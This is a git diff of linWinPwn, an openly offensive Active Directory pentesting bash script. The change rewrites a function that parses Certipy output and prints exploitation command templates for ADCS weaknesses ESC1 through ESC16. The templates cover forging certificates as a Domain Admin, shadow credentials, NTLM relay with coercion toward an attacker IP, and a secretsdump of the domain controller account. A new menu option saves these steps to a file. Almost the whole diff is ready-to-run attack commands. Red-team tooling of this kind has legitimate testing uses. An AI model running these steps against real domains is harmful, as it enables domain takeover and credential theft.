@@ -148,7 +148,7 @@ print_banner() {
       | || | | | |\ V  V / | | | | |  __/ \ V  V /| | | | 
       |_||_|_| |_| \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_| 
 
-      ${BLUE}linWinPwn: ${CYAN}version 1.2.0 ${NC}
+      ${BLUE}linWinPwn: ${CYAN}version 1.2.1 ${NC}
       https://github.com/lefayjey/linWinPwn
       ${BLUE}Author: ${CYAN}lefayjey${NC}
       ${BLUE}Inspired by: ${CYAN}S3cur3Th1sSh1t's WinPwn${NC}
@@ -2092,83 +2092,83 @@ adcs_vuln_parse() {
     fi
     esc1_vuln=$(/usr/bin/jq -r '."Certificate Templates"[] | select (."[!] Vulnerabilities"."ESC1" and (."[!] Vulnerabilities"[] | contains("Admins") | not) and ."Enabled" == true)."Template Name"' "${ADCS_dir}/vuln_${dc_domain}_Certipy.json" 2>/dev/null | sort -u)
     if [[ -n $esc1_vuln ]]; then
-        echo -e "${GREEN}[+] Templates vulnerable to ESC1 potentially found! Follow steps below for exploitation:${NC}"
+        echo -e "\n${GREEN}[+] ESC1 vulnerability potentially found! Follow steps below for exploitation:${NC}"
         for vulntemp in $esc1_vuln; do
-            echo -e "${YELLOW}# ${vulntemp} certificate template${NC}"
-            echo -e "${CYAN}1. Request certificate with an arbitrary UPN (domain_admin or DC or both):${NC}"
-            echo -e "${certipy} req ${argument_certipy} -ca < ${pki_cas//SPACE/ } > -target < ${pki_servers} > -template ${vulntemp} -upn domain_admin@${dc_domain} -dns ${dc_FQDN} -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapbindsign_param}"
-            echo -e "${CYAN}2. Authenticate using pfx of domain_admin or DC:${NC}"
-            echo -e "${certipy} auth -pfx domain_admin_dc.pfx -dc-ip ${dc_ip} -sid < ${sid_domain}-500 >"
+            echo -e "\n${BLUE}# ${vulntemp} certificate template${NC}"
+            echo -e "${CYAN}1. Request certificate with an arbitrary UPN (Domain Admin or DC or both):${NC}"
+            echo -e "${certipy} req ${argument_certipy} -ca < ${pki_cas//SPACE/ } > -target < ${pki_servers} > -template ${vulntemp} -upn < Domain Admin >@${dc_domain} -dns ${dc_FQDN} -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapbindsign_param}"
+            echo -e "${CYAN}2. Authenticate using pfx of Domain Admin or DC:${NC}"
+            echo -e "${certipy} auth -pfx < Domain Admin_Domain Controller >.pfx -dc-ip ${dc_ip} -sid < ${sid_domain}-500 >"
         done
     fi
 
     esc2_3_vuln=$(/usr/bin/jq -r '."Certificate Templates"[] | select ((."[!] Vulnerabilities"."ESC2" or ."[!] Vulnerabilities"."ESC3") and (."[!] Vulnerabilities"[] | contains("Admins") | not) and ."Enabled" == true)."Template Name"' "${ADCS_dir}/vuln_${dc_domain}_Certipy.json" 2>/dev/null | sort -u)
     if [[ -n $esc2_3_vuln ]]; then
-        echo -e "${GREEN}[+] Templates vulnerable to ESC2 or ESC3 potentially found! Follow steps below for exploitation:${NC}"
+        echo -e "\n${GREEN}[+] ESC2 or ESC3 vulnerability potentially found! Follow steps below for exploitation:${NC}"
         for vulntemp in $esc2_3_vuln; do
-            echo -e "${YELLOW}# ${vulntemp} certificate template${NC}"
+            echo -e "\n${BLUE}# ${vulntemp} certificate template${NC}"
             echo -e "${CYAN}1. Request a certificate based on the vulnerable template:${NC}"
             echo -e "${certipy} req ${argument_certipy} -ca < ${pki_cas//SPACE/ } > -target < ${pki_servers} > -template ${vulntemp} -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapbindsign_param}"
-            echo -e "${CYAN}2. Use the Certificate Request Agent certificate to request a certificate on behalf of the domain_admin:${NC}"
-            echo -e "${certipy} req ${argument_certipy} -ca < ${pki_cas//SPACE/ } > -target < ${pki_servers} > -template User -on-behalf-of $(echo "$dc_domain" | cut -d "." -f 1)\\domain_admin -pfx '${user}.pfx' -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapbindsign_param}"
-            echo -e "${CYAN}3. Authenticate using pfx of domain_admin:${NC}"
-            echo -e "${certipy} auth -pfx domain_admin.pfx -dc-ip ${dc_ip} ${ldaps_param}"
+            echo -e "${CYAN}2. Use the Certificate Request Agent certificate to request a certificate on behalf of the Domain Admin:${NC}"
+            echo -e "${certipy} req ${argument_certipy} -ca < ${pki_cas//SPACE/ } > -target < ${pki_servers} > -template User -on-behalf-of $(echo "$dc_domain" | cut -d "." -f 1)\\< Domain Admin > -pfx '${user}.pfx' -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapbindsign_param}"
+            echo -e "${CYAN}3. Authenticate using pfx of Domain Admin:${NC}"
+            echo -e "${certipy} auth -pfx < Domain Admin >.pfx -dc-ip ${dc_ip} ${ldaps_param}"
         done
     fi
 
     esc4_vuln=$(/usr/bin/jq -r '."Certificate Templates"[] | select (."[!] Vulnerabilities"."ESC4" and (."[!] Vulnerabilities"[] | contains("Admins") | not) and ."Enabled" == true)."Template Name"' "${ADCS_dir}/vuln_${dc_domain}_Certipy.json" 2>/dev/null | sort -u)
     if [[ -n $esc4_vuln ]]; then
-        echo -e "${GREEN}[+] Templates vulnerable to ESC4 potentially found! Follow steps below for exploitation:${NC}"
+        echo -e "\n${GREEN}[+] ESC4 vulnerability potentially found! Follow steps below for exploitation:${NC}"
         for vulntemp in $esc4_vuln; do
-            echo -e "${YELLOW}# ${vulntemp} certificate template${NC}"
+            echo -e "\n${BLUE}# ${vulntemp} certificate template${NC}"
             echo -e "${CYAN}1. Make the template vulnerable to ESC1:${NC}"
             echo -e "${certipy} template ${argument_certipy} -template ${vulntemp} -save-old -dc-ip ${dc_ip} ${ldaps_param} ${ldapbindsign_param}"
-            echo -e "${CYAN}2. Request certificate with an arbitrary UPN (domain_admin or DC or both):${NC}"
-            echo -e "${certipy} req ${argument_certipy} -ca < ${pki_cas//SPACE/ } > -target < ${pki_servers} > -template ${vulntemp} -upn domain_admin@${dc_domain} -dns ${dc_FQDN} -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapbindsign_param}"
+            echo -e "${CYAN}2. Request certificate with an arbitrary UPN (Domain Admin or DC or both):${NC}"
+            echo -e "${certipy} req ${argument_certipy} -ca < ${pki_cas//SPACE/ } > -target < ${pki_servers} > -template ${vulntemp} -upn < Domain Admin >@${dc_domain} -dns ${dc_FQDN} -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapbindsign_param}"
             echo -e "${CYAN}3. Restore configuration of vulnerable template:${NC}"
             echo -e "${certipy} template ${argument_certipy} -template ${vulntemp} -configuration ${vulntemp}.json ${ldaps_param} ${ldapbindsign_param}"
-            echo -e "${CYAN}4. Authenticate using pfx of domain_admin or DC:${NC}"
-            echo -e "${certipy} auth -pfx domain_admin_dc.pfx -dc-ip ${dc_ip} ${ldaps_param}"
+            echo -e "${CYAN}4. Authenticate using pfx of Domain Admin or DC:${NC}"
+            echo -e "${certipy} auth -pfx < Domain Admin_Domain Controller >.pfx -dc-ip ${dc_ip} ${ldaps_param}"
         done
     fi
 
     esc6_vuln=$(/usr/bin/jq -r '."Certificate Authorities"[] | select (."[!] Vulnerabilities"."ESC6") | ."CA Name"' "${ADCS_dir}/vuln_${dc_domain}_Certipy.json" 2>/dev/null | sort -u)
     if [[ -n $esc6_vuln ]]; then
-        echo -e "${GREEN}[+] ESC6 vulnerability potentially found! Follow steps below for exploitation:${NC}"
+        echo -e "\n${GREEN}[+] ESC6 vulnerability potentially found! Follow steps below for exploitation:${NC}"
         for vulnca in $esc6_vuln; do
-            echo -e "${YELLOW}# ${vulnca} certificate authority${NC}"
-            echo -e "${CYAN}1. Request certificate with an arbitrary UPN (domain_admin or DC or both):${NC}"
-            echo -e "${certipy} req ${argument_certipy} -ca $vulnca -target < ${pki_servers} > -template User -upn domain_admin@${dc_domain} -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapbindsign_param}"
-            echo -e "${CYAN}2. Authenticate using pfx of domain_admin:${NC}"
-            echo -e "${certipy} auth -pfx domain_admin.pfx -dc-ip ${dc_ip} ${ldaps_param}"
+            echo -e "\n${BLUE}# ${vulnca} certificate authority${NC}"
+            echo -e "${CYAN}1. Request certificate with an arbitrary UPN (Domain Admin or DC or both):${NC}"
+            echo -e "${certipy} req ${argument_certipy} -ca ${vulnca} -target < ${pki_servers} > -template User -upn < Domain Admin >@${dc_domain} -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapbindsign_param}"
+            echo -e "${CYAN}2. Authenticate using pfx of Domain Admin:${NC}"
+            echo -e "${certipy} auth -pfx < Domain Admin >.pfx -dc-ip ${dc_ip} ${ldaps_param}"
         done
     fi
 
     esc7_vuln=$(/usr/bin/jq -r '."Certificate Authorities"[] | select (."[!] Vulnerabilities"."ESC7") | ."CA Name"' "${ADCS_dir}/vuln_${dc_domain}_Certipy.json" 2>/dev/null | sort -u)
     if [[ -n $esc7_vuln ]]; then
-        echo -e "${GREEN}[+] ESC7 vulnerability potentially found! Follow steps below for exploitation:${NC}"
+        echo -e "\n${GREEN}[+] ESC7 vulnerability potentially found! Follow steps below for exploitation:${NC}"
         for vulnca in $esc7_vuln; do
-            echo -e "${YELLOW}# ${vulnca} certificate authority${NC}"
+            echo -e "\n${BLUE}# ${vulnca} certificate authority${NC}"
             echo -e "${CYAN}1. Add a new officer:${NC}"
-            echo -e "${certipy} ca ${argument_certipy} -ca $vulnca -add-officer '${user}' -dc-ip ${dc_ip} ${ldaps_param} ${ldapbindsign_param}"
+            echo -e "${certipy} ca ${argument_certipy} -ca ${vulnca} -add-officer '${user}' -dc-ip ${dc_ip} ${ldaps_param} ${ldapbindsign_param}"
             echo -e "${CYAN}2. Enable SubCA certificate template:${NC}"
-            echo -e "${certipy} ca ${argument_certipy} -ca $vulnca -enable-template SubCA -dc-ip ${dc_ip} ${ldaps_param} ${ldapbindsign_param}"
+            echo -e "${certipy} ca ${argument_certipy} -ca ${vulnca} -enable-template SubCA -dc-ip ${dc_ip} ${ldaps_param} ${ldapbindsign_param}"
             echo -e "${CYAN}3. Save the private key and note down the request ID:${NC}"
-            echo -e "${certipy} req ${argument_certipy} -ca $vulnca -target < ${pki_servers} > -template SubCA -upn domain_admin@${dc_domain} -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapbindsign_param}"
+            echo -e "${certipy} req ${argument_certipy} -ca ${vulnca} -target < ${pki_servers} > -template SubCA -upn < Domain Admin >@${dc_domain} -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapbindsign_param}"
             echo -e "${CYAN}4. Issue a failed request (need ManageCA and ManageCertificates rights for a failed request):${NC}"
-            echo -e "${certipy} ca ${argument_certipy} -ca $vulnca -issue-request <request_ID> -dc-ip ${dc_ip} ${ldaps_param} ${ldapbindsign_param}"
+            echo -e "${certipy} ca ${argument_certipy} -ca ${vulnca} -issue-request <request_ID> -dc-ip ${dc_ip} ${ldaps_param} ${ldapbindsign_param}"
             echo -e "${CYAN}5. Retrieve an issued certificate:${NC}"
-            echo -e "${certipy} req ${argument_certipy} -ca $vulnca -target < ${pki_servers} > -retrieve <request_ID> -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapbindsign_param}"
-            echo -e "${CYAN}6. Authenticate using pfx of domain_admin:${NC}"
-            echo -e "${certipy} auth -pfx domain_admin.pfx -dc-ip ${dc_ip} ${ldaps_param}"
+            echo -e "${certipy} req ${argument_certipy} -ca ${vulnca} -target < ${pki_servers} > -retrieve <request_ID> -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapbindsign_param}"
+            echo -e "${CYAN}6. Authenticate using pfx of Domain Admin:${NC}"
+            echo -e "${certipy} auth -pfx < Domain Admin >.pfx -dc-ip ${dc_ip} ${ldaps_param}"
         done
     fi
 
     esc8_vuln=$(/usr/bin/jq -r '."Certificate Authorities"[] | select (."[!] Vulnerabilities"."ESC8") | ."CA Name"' "${ADCS_dir}/vuln_${dc_domain}_Certipy.json" 2>/dev/null | sort -u)
     if [[ -n $esc8_vuln ]]; then
-        echo -e "${GREEN}[+] ESC8 vulnerability potentially found! Follow steps below for exploitation:${NC}"
+        echo -e "\n${GREEN}[+] ESC8 vulnerability potentially found! Follow steps below for exploitation:${NC}"
         for vulnca in $esc8_vuln; do
-            echo -e "${YELLOW}# ${vulnca} certificate authority${NC}"
+            echo -e "\n${BLUE}# ${vulnca} certificate authority${NC}"
             echo -e "${CYAN}1. Start the relay server:${NC}"
             echo -e "${certipy} relay -target http://< ${pki_servers} > -ca ${vulnca} -template DomainController ${ldaps_param} ${ldapbindsign_param}"
             echo -e "${CYAN}2. Coerce Domain Controller:${NC}"
@@ -2180,53 +2180,102 @@ adcs_vuln_parse() {
 
     esc9_vuln=$(/usr/bin/jq -r '."Certificate Templates"[] | select (."[!] Vulnerabilities"."ESC9" and (."[!] Vulnerabilities"[] | contains("Admins") | not) and ."Enabled" == true)."Template Name"' "${ADCS_dir}/vuln_${dc_domain}_Certipy.json" 2>/dev/null | sort -u)
     if [[ -n $esc9_vuln ]]; then
-        echo -e "${GREEN}[+] ESC9 vulnerability potentially found! Follow steps below for exploitation:${NC}"
+        echo -e "\n${GREEN}[+] ESC9 vulnerability potentially found! Follow steps below for exploitation:${NC}"
         for vulntemp in $esc9_vuln; do
-            echo -e "${YELLOW}# ${vulntemp} certificate template${NC}"
+            echo -e "\n${BLUE}# ${vulntemp} certificate template${NC}"
             echo -e "${CYAN}1. Retrieve second_user's NT hash Shadow Credentials (GenericWrite against second_user):${NC}"
             echo -e "${certipy} shadow auto ${argument_certipy} -account <second_user> -dc-ip ${dc_ip} ${ldaps_param} ${ldapbindsign_param}"
-            echo -e "${CYAN}2. Change userPrincipalName of second_user to domain_admin:${NC}"
-            echo -e "${certipy} account update ${argument_certipy} -user <second_user> -upn domain_admin@${dc_domain} -dc-ip ${dc_ip} ${ldaps_param} ${ldapbindsign_param}"
+            echo -e "${CYAN}2. Change userPrincipalName of second_user to Domain Admin:${NC}"
+            echo -e "${certipy} account update ${argument_certipy} -user <second_user> -upn < Domain Admin >@${dc_domain} -dc-ip ${dc_ip} ${ldaps_param} ${ldapbindsign_param}"
             echo -e "${CYAN}3. Request vulnerable certificate as second_user:${NC}"
             echo -e "${certipy} req -username <second_user>@${dc_domain} -hash <second_user_hash> -target < ${pki_servers} > -ca < ${pki_cas//SPACE/ } > -template ${vulntemp} -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapbindsign_param}"
             echo -e "${CYAN}4. Change second_user's UPN back:${NC}"
             echo -e "${certipy} account update ${argument_certipy} -user <second_user> -upn <second_user>@${dc_domain} -dc-ip ${dc_ip} ${ldaps_param} ${ldapbindsign_param}"
-            echo -e "${CYAN}5. Authenticate using pfx of domain_admin:${NC}"
-            echo -e "${certipy} auth -pfx domain_admin.pfx -dc-ip ${dc_ip} ${ldaps_param}"
+            echo -e "${CYAN}5. Authenticate as the target administrator:${NC}"
+            echo -e "${certipy} auth -pfx < Domain Admin >.pfx -dc-ip ${dc_ip} ${ldaps_param}"
         done
     fi
 
     esc10_vuln=$(/usr/bin/jq -r '."Certificate Authorities"[] | select (."[!] Vulnerabilities"."ESC10") | ."CA Name"' "${ADCS_dir}/vuln_${dc_domain}_Certipy.json" 2>/dev/null | sort -u)
     if [[ -n $esc10_vuln ]]; then
-        echo -e "${GREEN}[+] ESC10 vulnerability potentially found! Follow steps below for exploitation:${NC}"
+        echo -e "\n${GREEN}[+] ESC10 vulnerability potentially found! Follow steps below for exploitation:${NC}"
         for vulnca in $esc10_vuln; do
-            echo -e "${YELLOW}# ${vulnca} certificate authority${NC}"
+            echo -e "\n${BLUE}# ${vulnca} certificate authority${NC}"
             echo -e "${CYAN}1. Retrieve second_user's NT hash Shadow Credentials (GenericWrite against second_user):${NC}"
             echo -e "${certipy} shadow auto ${argument_certipy} -account <second_user> -dc-ip ${dc_ip} ${ldaps_param} ${ldapbindsign_param}"
-            echo -e "${CYAN}2. Change userPrincipalName of user2 to domain_admin or DC:${NC}"
-            echo -e "${certipy} account update ${argument_certipy} -user <second_user> -upn domain_admin@${dc_domain} -dc-ip ${dc_ip} ${ldaps_param} ${ldapbindsign_param}"
+            echo -e "${CYAN}2. Change userPrincipalName of user2 to Domain Admin or DC:${NC}"
+            echo -e "${certipy} account update ${argument_certipy} -user <second_user> -upn < Domain Admin >@${dc_domain} -dc-ip ${dc_ip} ${ldaps_param} ${ldapbindsign_param}"
             echo -e "${certipy} account update ${argument_certipy} -user <second_user> -upn ${dc_NETBIOS}\\\$@${dc_domain} -dc-ip ${dc_ip} ${ldaps_param} ${ldapbindsign_param}"
             echo -e "${CYAN}3. Request certificate permitting client authentication as second_user:${NC}"
-            echo -e "${certipy} req -username <second_user>@${dc_domain} -hash <second_user_hash> -ca $vulnca -template User -dc-ip ${dc_ip} -key-size 4096" ${ldaps_param} ${ldapbindsign_param}
+            echo -e "${certipy} req -username <second_user>@${dc_domain} -hash <second_user_hash> -ca ${vulnca} -template User -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapbindsign_param}"
             echo -e "${CYAN}4. Change second_user's UPN back:${NC}"
             echo -e "${certipy} account update ${argument_certipy} -user <second_user> -upn <second_user>@${dc_domain} -dc-ip ${dc_ip} ${ldaps_param} ${ldapbindsign_param}"
-            echo -e "${CYAN}5. Authenticate using pfx of domain_admin or DC:${NC}"
-            echo -e "${certipy} auth -pfx domain_admin.pfx -dc-ip ${dc_ip} ${ldaps_param}"
+            echo -e "${CYAN}5. Authenticate using pfx of Domain Admin or DC:${NC}"
+            echo -e "${certipy} auth -pfx < Domain Admin >.pfx -dc-ip ${dc_ip} ${ldaps_param}"
             echo -e "${certipy} auth -pfx ${dc_NETBIOS}$.pfx -dc-ip ${dc_ip} ${ldaps_param}"
         done
     fi
 
     esc11_vuln=$(/usr/bin/jq -r '."Certificate Authorities"[] | select (."[!] Vulnerabilities"."ESC11") | ."CA Name"' "${ADCS_dir}/vuln_${dc_domain}_Certipy.json" 2>/dev/null | sort -u)
     if [[ -n $esc11_vuln ]]; then
-        echo -e "${GREEN}[+] ESC11 vulnerability potentially found! Follow steps below for exploitation:${NC}"
+        echo -e "\n${GREEN}[+] ESC11 vulnerability potentially found! Follow steps below for exploitation:${NC}"
         for vulnca in $esc11_vuln; do
-            echo -e "${YELLOW}# ${vulnca} certificate authority${NC}"
+            echo -e "\n${BLUE}# ${vulnca} certificate authority${NC}"
             echo -e "${CYAN}1. Start the relay server (relay to the Certificate Authority and request certificate via ICPR):${NC}"
-            echo -e "ntlmrelayx.py -t rpc://< ${pki_servers} > -rpc-mode ICPR -icpr-ca-name $vulnca -smb2support"
+            echo -e "ntlmrelayx.py -t rpc://< ${pki_servers} > -rpc-mode ICPR -icpr-ca-name ${vulnca} -smb2support"
             echo -e "OR"
             echo -e "${certipy} relay -target rpc://< ${pki_servers} > -ca ${vulnca}"
             echo -e "${CYAN}2. Coerce Domain Controller:${NC}"
             echo -e "${coercer} coerce ${argument_coercer} -t ${i} -l $attacker_IP --dc-ip $dc_ip"
+        done
+    fi
+
+    esc13_vuln=$(/usr/bin/jq -r '."Certificate Templates"[] | select (."[!] Vulnerabilities"."ESC13" and (."[!] Vulnerabilities"[] | contains("Admins") | not) and ."Enabled" == true)."Template Name"' "${ADCS_dir}/vuln_${dc_domain}_Certipy.json" 2>/dev/null | sort -u)
+    if [[ -n $esc13_vuln ]]; then
+        echo -e "\n${GREEN}[+] ESC13 vulnerability potentially found! Follow steps below for exploitation:${NC}"
+        for vulntemp in $esc13_vuln; do
+            echo -e "\n${BLUE}# ${vulntemp} certificate template${NC}"
+            echo -e "${CYAN}1. Request a certificate from the vulnerable template:${NC}"
+            echo -e "${certipy} req ${argument_certipy} -target < ${pki_servers} > -ca < ${pki_cas//SPACE/ } > -template ${vulntemp} -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapbindsign_param}"
+            echo -e "${CYAN}2. Authenticate with the obtained certificate to get a TGT:${NC}"
+            echo -e "${certipy} auth -pfx ${user}.pfx -dc-ip ${dc_ip} ${ldaps_param}"
+            echo -e "${CYAN}3. Use the obtained TGT to perform privileged actions:${NC}"
+            echo -e "export KRB5CCNAME=${user}.ccache"
+            echo -e "secretsdump.py -just-dc-user '${dc_NETBIOS}$' ${argument_imp} -dc-ip ${dc_ip} -k -no-pass"
+        done
+    fi
+
+    esc15_vuln=$(/usr/bin/jq -r '."Certificate Templates"[] | select (."[!] Vulnerabilities"."ESC15" and (."[!] Vulnerabilities"[] | contains("Admins") | not) and ."Enabled" == true)."Template Name"' "${ADCS_dir}/vuln_${dc_domain}_Certipy.json" 2>/dev/null | sort -u)
+    if [[ -n $esc15_vuln ]]; then
+        echo -e "\n${GREEN}[+] ESC15 vulnerability potentially found! Follow steps below for exploitation:${NC}"
+        for vulntemp in $esc15_vuln; do
+            echo -e "\n${BLUE}# ${vulntemp} certificate template${NC}"
+            echo -e "${CYAN}1. Request a certificate injecting 'Client Authentication' Application Policy:${NC}"
+            echo -e "${certipy} req ${argument_certipy} -target < ${pki_servers} > -ca < ${pki_cas//SPACE/ } > -template ${vulntemp} -application-policies 'Client Authentication' -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapbindsign_param}"
+            echo -e "OR"
+            echo -e "${CYAN}1. Request a certificate, injecting 'Certificate Request Agent' Application Policy, then using the 'Agent' certificate:${NC}"
+            echo -e "${certipy} req ${argument_certipy} -target < ${pki_servers} > -ca < ${pki_cas//SPACE/ } > -template ${vulntemp} -upn < Domain Admin >@${dc_domain} -sid '${sid_domain}-500' -application-policies 'Certificate Request Agent' -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapbindsign_param}"
+            echo -e "${certipy} req ${argument_certipy} -target < ${pki_servers} > -ca < ${pki_cas//SPACE/ } > -template User -on-behalf-of $(echo "$dc_domain" | cut -d "." -f 1)\\< Domain Admin > -pfx '${user}.pfx' -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapbindsign_param}"
+            echo -e "${CYAN}6. Authenticate using pfx of Domain Admin:${NC}"
+            echo -e "${certipy} auth -pfx < Domain Admin >.pfx -dc-ip ${dc_ip} ${ldaps_param}"
+        done
+    fi
+
+    esc16_vuln=$(/usr/bin/jq -r '."Certificate Authorities"[] | select (."[!] Vulnerabilities"."ESC16") | ."CA Name"' "${ADCS_dir}/vuln_${dc_domain}_Certipy.json" 2>/dev/null | sort -u)
+    if [[ -n $esc16_vuln ]]; then
+        echo -e "\n${GREEN}[+] ESC16 vulnerability potentially found! Follow steps below for exploitation:${NC}"
+        for vulnca in $esc16_vuln; do
+            echo -e "\n${BLUE}# ${vulnca} certificate authority${NC}"
+            echo -e "${CYAN}1. Update the victim account's UPN to the target administrator's sAMAccountName:${NC}"
+            echo -e "${certipy} account update ${argument_certipy} -dc-ip ${dc_ip} -user < Victim > -upn < Domain Admin >@${dc_domain} ${ldaps_param} ${ldapbindsign_param}"
+            echo -e "${CYAN}2. Retrieve credentials of the victim account using Shadow Credentials:${NC}"
+            echo -e "${certipy} shadow auto ${argument_certipy} -dc-ip ${dc_ip} -account < Victim > ${ldaps_param} ${ldapbindsign_param}"
+            echo -e "${CYAN}3. Request a certificate as the Victim user from any suitable 'Client Authentication' template:${NC}"
+            echo -e "${certipy} req ${argument_certipy} -k -target < ${pki_servers} > -ca ${vulnca} -template User -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapbindsign_param}"
+            echo -e "${CYAN}4. Revert the victim account's UPN:${NC}"
+            echo -e "${certipy} account update ${argument_certipy} -dc-ip ${dc_ip} -user < Victim > -upn < Victim >@${dc_domain} ${ldaps_param} ${ldapbindsign_param}"
+            echo -e "${CYAN}6. Authenticate using pfx of Domain Admin:${NC}"
+            echo -e "${certipy} auth -pfx < Domain Admin >.pfx -dc-ip ${dc_ip} ${ldaps_param}"
         done
     fi
 }
@@ -4929,6 +4978,7 @@ adcs_menu() {
     else
         echo -e "A) ADCS ENUMERATIONS #1-2-3-4"
     fi
+    echo -e "P) Print ADCS Exploitation Steps"
     echo -e "1) ADCS Enumeration using netexec"
     echo -e "2) certi.py ADCS Enumeration"
     echo -e "3) Certipy ADCS Enumeration"
@@ -4945,6 +4995,11 @@ adcs_menu() {
     case ${option_selected} in
     A)
         adcs_enum
+        adcs_menu
+        ;;
+
+    P)
+        adcs_vuln_parse | tee "${ADCS_dir}/ADCS_exploitation_steps_${dc_domain}.txt"
         adcs_menu
         ;;
 
